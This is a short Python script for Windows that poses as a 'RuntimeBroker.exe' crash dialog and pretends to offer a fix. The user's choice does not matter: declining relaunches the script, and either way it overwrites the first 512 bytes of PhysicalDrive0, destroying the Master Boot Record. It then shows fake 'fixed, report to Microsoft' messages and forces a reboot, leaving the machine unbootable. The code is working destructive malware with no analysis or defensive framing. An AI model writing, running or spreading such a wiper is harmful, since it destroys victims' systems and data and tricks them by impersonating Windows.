import os 
import time 
from os import system 
from subprocess import call 
os.system('pip install pywin32') 
from win32file import * 
from win32ui import * 
from win32con import * 
from win32gui import * 
from sys import exit 

time.sleep(2)

# Alert box
warningtitle = 'Program crashed - RuntimeBroker.exe'
warningdescription = 'The instruction at 0x00007FF950FCBE4B reference memory at 0x000000000000024, The memory could not written.           Would you like to restart?'

if MessageBox(warningdescription, warningtitle, MB_ICONWARNING | MB_YESNO) == 7: 
  MessageBox("RuntimeBroker.exe is very inportant, your pc could run into many falulars, would you like to restart RuntimeBroker.exe", "Alert - RuntimeBroker.exe", MB_ICONWARNING | MB_OK)
  call(["python", "GoodNight.py"]) # run again... your not gonna get out of this :)
  time.sleep(250)
  exit()

# | OverWrite Script |
hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create handle
WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite MBR!
CloseHandle(hDevice) # Close the handle

MessageBox("RuntimeBroker.exe has been fixed, please report to microsoft support is any more problems occur.", "Restarted - RuntimeBroker.exe", MB_ICONWARNING | MB_OK) 
time.sleep(120)
MessageBox("Your PC requires a restart. (Reason: Master Boot Record(MBR) has been changed) Please click ok to restart.", "System", MB_ICONWARNING | MB_OK) 

os.system("shutdown /r /t 1")
